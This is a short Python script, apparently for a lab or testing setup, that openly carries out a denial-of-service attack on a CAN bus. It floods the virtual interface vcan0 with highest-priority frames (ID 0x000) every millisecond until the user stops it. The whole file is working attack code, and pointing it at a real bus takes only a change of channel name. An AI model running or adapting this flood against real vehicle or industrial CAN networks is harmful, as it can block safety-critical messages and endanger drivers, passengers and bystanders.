import can
import time

def main():
    print("Conducting Denial of Service (DoS) attack on CAN bus...")
    bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
    try:
        while True:
            # Flood the CAN bus with empty frames
            # Add some data in the payload
            msg = can.Message(arbitration_id=0x000, data=[0x00, 0x00, 0x00], is_extended_id=False)
            bus.send(msg)
            time.sleep(0.001)
            print("Sent DoS message on CAN bus")
    except KeyboardInterrupt:
        print("DoS attack stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if  __name__ == "__main__":
    main()
